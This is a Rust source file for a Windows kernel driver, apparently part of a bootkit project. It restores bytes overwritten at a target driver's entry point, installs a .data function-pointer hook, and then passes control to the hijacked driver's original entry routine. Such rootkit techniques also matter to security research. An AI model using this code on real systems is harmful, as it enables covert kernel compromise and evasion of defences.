#![no_std]
#![allow(non_camel_case_types)]
#![allow(non_snake_case)]
#![allow(non_upper_case_globals)]

extern crate alloc;
use kernel_log::KernelLogger;
use log::LevelFilter;
use winapi::{
    km::wdm::DRIVER_OBJECT,
    shared::ntdef::{NTSTATUS, UNICODE_STRING},
};
mod hooks;
mod includes;
mod mapper;
mod pe;
mod restore;
use crate::{hooks::setup_hooks, restore::restore_bytes};

#[allow(unused_imports)]
use core::panic::PanicInfo;

pub const JMP_SIZE: usize = 14;
pub const MAPPER_DATA_SIZE: usize = JMP_SIZE + 7;

// Change if global.rs hash is changed in bootkit
#[no_mangle]
pub static mut mapper_data: [u8; MAPPER_DATA_SIZE] = [0; MAPPER_DATA_SIZE];

#[no_mangle]
pub extern "system" fn __CxxFrameHandler3(_: *mut u8, _: *mut u8, _: *mut u8, _: *mut u8) -> i32 {
    unimplemented!()
}

#[global_allocator]
static GLOBAL: kernel_alloc::KernelAlloc = kernel_alloc::KernelAlloc;

#[export_name = "_fltused"]
static _FLTUSED: i32 = 0;

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

type DriverEntryType =
    fn(driver_object: &mut DRIVER_OBJECT, registry_path: &UNICODE_STRING) -> NTSTATUS;

static mut DriverEntry: Option<DriverEntryType> = None;

#[no_mangle]
pub extern "system" fn driver_entry(
    driver_object: &mut DRIVER_OBJECT,
    registry_path: &UNICODE_STRING,
    target_module_entry: *mut u8,
) -> NTSTATUS {
    KernelLogger::init(LevelFilter::Info).expect("Failed to initialize logger");
    log::info!("[+] Driver Entry called");

    /* Restores the stolen bytes */
    restore_bytes(target_module_entry);

    /* Perform a simple .data function pointer hook */
    setup_hooks();

    //driver_object.DriverUnload = Some(driver_unload);

    log::info!("[+] Executing unhooked DriverEntry of target driver...");
    // Call the original driver entry to restore execution flow (target driver)
    unsafe {
        DriverEntry = Some(core::mem::transmute::<*mut u8, DriverEntryType>(
            target_module_entry,
        ))
    };
    return unsafe { DriverEntry.unwrap()(driver_object, registry_path) };
}

// When manually mapping a driver you don't call driver_unload. You restart the system instead.
/*
pub extern "system" fn driver_unload(_driver: &mut DRIVER_OBJECT) {
    log::info!("Driver unloaded successfully!");
}
*/
